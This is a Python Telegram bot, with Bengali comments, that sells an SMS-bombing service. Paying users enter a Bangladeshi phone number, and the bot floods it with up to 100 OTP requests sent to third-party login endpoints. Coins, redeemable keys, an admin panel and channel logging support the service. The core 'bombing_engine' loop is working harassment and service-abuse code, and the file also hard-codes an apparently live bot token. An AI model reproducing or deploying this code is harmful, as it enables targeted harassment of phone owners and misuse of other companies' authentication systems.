import telebot
import requests
import json
import os
import time
import threading
import random
import string
from telebot import types
from datetime import datetime

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস সিস্টেম (নিখুঁত ও সুরক্ষিত) ---
def load_data(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    with open(file, 'r') as f:
        return json.load(f)

def save_data(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

users = load_data('users.json')
keys = load_data('keys.json')

# --- লগিং ফাংশন ---
def log_to_channel(text):
    try:
        bot.send_message(LOG_CHANNEL, f"✨ **[SYSTEM LOG]**\n⏰ {datetime.now().strftime('%I:%M:%S %p')}\n━━━━━━━━━━━━━━\n{text}")
    except: pass

# --- মেম্বারশিপ চেক ---
def check_join(uid):
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, uid)
        return member.status in ['member', 'administrator', 'creator']
    except: return True

# --- ইউজার ম্যানেজমেন্ট ---
def get_user(user):
    uid = str(user.id)
    if uid not in users:
        users[uid] = {
            "name": user.first_name,
            "username": f"@{user.username}" if user.username else "N/A",
            "coins": 50,
            "status": "Active", # Active, Blocked, Lifetime
            "total_sent": 0
        }
        save_data('users.json', users)
        log_to_channel(f"🆕 **New User Registered**\n👤 Name: {user.first_name}\n🆔 ID: `{uid}`")
    return users[uid]

# --- কমান্ড: Start ---
@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    u = get_user(message.from_user)

    if not check_join(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL[1:]}"))
        markup.add(types.InlineKeyboardButton("✅ I have Joined", callback_data="check_verify"))
        bot.send_message(message.chat.id, "⚠️ **Access Denied!**\n\nYou must join our channel to use this bot.", reply_markup=markup)
        return

    if u['status'] == "Blocked":
        bot.send_message(message.chat.id, "🚫 **Access Revoked!**\nYour account is blocked by Admin.\n💬 Contact: @DarkUnkwon")
        return

    main_menu(message.chat.id, u)

def main_menu(chat_id, u):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start Attack", callback_data="start_bomb"),
        types.InlineKeyboardButton("👤 Profile", callback_data="view_profile")
    )
    markup.add(
        types.InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_key"),
        types.InlineKeyboardButton("📊 Stats", callback_data="bot_stats")
    )
    
    text = (
        f"👋 **Welcome, {u['name']}!**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🏆 Status: `{u['status']}`\n"
        f"💰 Coins: `{u['coins']}`\n"
        f"📈 Total Sent: `{u['total_sent']}`\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"⚡ _Choose an option below:_ "
    )
    bot.send_photo(chat_id, LOGO_URL, caption=text, reply_markup=markup)

# --- এডমিন প্যানেল (১০০% কার্যকরী) ---

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    
    panel = (
        "👑 **Admin Control Panel**\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "📊 `/stats` - Total stats\n"
        "👥 `/users` - User list & status\n"
        "⚙️ `/setstatus [ID] [Status]`\n"
        "💰 `/addcoins [ID] [Amount]`\n"
        "🔑 `/gen [Amount]` - Create key\n"
        "📢 `/broadcast [Message]` - Global alert\n"
        "━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(message, panel)

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    total_u = len(users)
    total_s = sum(u['total_sent'] for u in users.values())
    bot.reply_to(message, f"📈 **System Overview:**\n\nTotal Users: `{total_u}`\nTotal SMS Sent: `{total_s}`\nKeys Ready: `{len(keys)}`")

@bot.message_handler(commands=['users'])
def users_list(message):
    if message.from_user.id != ADMIN_ID: return
    msg = "👥 **User List (Latest 20):**\n\n"
    for uid, data in list(users.items())[-20:]:
        msg += f"• `{uid}` | {data['name']} | `{data['status']}`\n"
    bot.reply_to(message, msg)

@bot.message_handler(commands=['setstatus'])
def status_update(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        parts = message.text.split()
        target = parts[1]
        new_stat = parts[2] # Blocked, Lifetime, Active
        if target in users:
            users[target]['status'] = new_stat
            save_data('users.json', users)
            bot.reply_to(message, f"✅ User `{target}` is now `{new_stat}`")
            log_to_channel(f"🛠 **Status Updated**\nUser: `{target}`\nNew Status: {new_stat}")
        else: bot.reply_to(message, "❌ User ID not found!")
    except: bot.reply_to(message, "Usage: `/setstatus ID Status`")

@bot.message_handler(commands=['addcoins'])
def add_coins_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        parts = message.text.split()
        target, amount = parts[1], int(parts[2])
        if target in users:
            users[target]['coins'] += amount
            save_data('users.json', users)
            bot.reply_to(message, f"✅ Added `{amount}` coins to `{target}`")
        else: bot.reply_to(message, "❌ User ID not found!")
    except: bot.reply_to(message, "Usage: `/addcoins ID Amount`")

@bot.message_handler(commands=['gen'])
def generate_key(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.split()[1])
        key = "DU-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
        keys[key] = amount
        save_data('keys.json', keys)
        bot.reply_to(message, f"🔑 **Key Generated:**\n`{key}`\nValue: `{amount} Coins`")
    except: bot.reply_to(message, "Usage: `/gen Amount`")

@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    text = message.text.replace('/broadcast ', '')
    sent = 0
    for uid in users:
        try:
            bot.send_message(uid, f"📢 **Admin Notification**\n━━━━━━━━━━━━━━\n{text}")
            sent += 1
        except: pass
    bot.reply_to(message, f"✅ Broadcast sent to {sent} users.")

# --- কলব্যাক হ্যান্ডলার ---

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    uid = str(call.from_user.id)
    u = users.get(uid)

    if call.data == "check_verify":
        if check_join(call.from_user.id):
            bot.delete_message(call.message.chat.id, call.message.message_id)
            main_menu(call.message.chat.id, u)
        else:
            bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)

    elif call.data == "view_profile":
        bot.send_message(call.message.chat.id, f"👤 **Profile Info**\n\nName: {u['name']}\nID: `{uid}`\nStatus: `{u['status']}`\nCoins: `{u['coins']}`\nSent: `{u['total_sent']}`")

    elif call.data == "start_bomb":
        if u['status'] == "Blocked":
            bot.answer_callback_query(call.id, "🚫 You are blocked!", show_alert=True)
            return
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 Digit):**")
        bot.register_next_step_handler(msg, get_number)

    elif call.data == "redeem_key":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Your Key:**")
        bot.register_next_step_handler(msg, redeem_process)

# --- বোম্বিং প্রসেস (Smooth Animation) ---

def get_number(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **How many SMS? (Max 100):**\n_Cost: 5 Coins per SMS_")
        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
    else:
        bot.send_message(message.chat.id, "❌ Invalid number format!")

def start_attack(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        uid = str(message.from_user.id)
        cost = amount * 5

        if users[uid]['status'] != "Lifetime" and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, f"⚠️ **Low Balance!**\nNeeded: `{cost}` | Have: `{users[uid]['coins']}`")
            return

        status_msg = bot.send_message(message.chat.id, "⚡ **Initializing Attack...**")
        threading.Thread(target=bombing_engine, args=(uid, num, amount, cost, status_msg)).start()
    except: bot.send_message(message.chat.id, "❌ Error in amount!")

def bombing_engine(uid, num, amount, cost, status_msg):
    success = 0
    apis = [
        "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "https://bikroy.com/data/relative/login-with-otp"
    ]

    for i in range(1, amount + 1):
        try:
            api = random.choice(apis)
            res = requests.post(api, json={"phone": num, "number": "+88"+num}, timeout=5)
            if res.status_code == 200: success += 1
            
            # অ্যানিমেশন আপডেট
            if i % 10 == 0 or i == amount:
                bar = "▰" * (i // 10) + "▱" * (10 - (i // 10))
                bot.edit_message_text(
                    f"🚀 **Attack in Progress...**\n━━━━━━━━━━━━━━\n🎯 Target: `{num}`\n📊 Progress: `{bar}` {i}/{amount}\n✅ Success: `{success}`",
                    status_msg.chat.id, status_msg.message_id
                )
            time.sleep(0.3)
        except: pass

    # ডাটা আপডেট
    if users[uid]['status'] != "Lifetime":
        users[uid]['coins'] -= cost
    users[uid]['total_sent'] += success
    save_data('users.json', users)

    final_markup = types.InlineKeyboardMarkup()
    final_markup.add(types.InlineKeyboardButton("🚀 Attack Again", callback_data="start_bomb"))
    
    bot.edit_message_text(
        f"✅ **Attack Completed!**\n━━━━━━━━━━━━━━\n🎯 Target: `{num}`\n📩 Total Sent: `{success}`\n💰 Coins Left: `{users[uid]['coins']}`\n━━━━━━━━━━━━━━",
        status_msg.chat.id, status_msg.message_id, reply_markup=final_markup
    )
    log_to_channel(f"🚀 **Attack Success**\nUser: {users[uid]['name']}\nTarget: `{num}`\nSent: `{success}`")

def redeem_process(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys:
        amount = keys[key]
        users[uid]['coins'] += amount
        del keys[key]
        save_data('users.json', users)
        save_data('keys.json', keys)
        bot.send_message(message.chat.id, f"✅ **Success!**\n`{amount}` coins added to your balance.")
        log_to_channel(f"🔑 **Key Redeemed**\nUser: {users[uid]['name']}\nKey: `{key}`\nAmount: `{amount}`")
    else:
        bot.send_message(message.chat.id, "❌ Invalid Key!")

# --- রান ---
if __name__ == "__main__":
    print("DU ModZ Pro Bot is running smooth...")
    log_to_channel("✅ **Bot is now Online and Smooth!**")
    bot.infinity_polling()
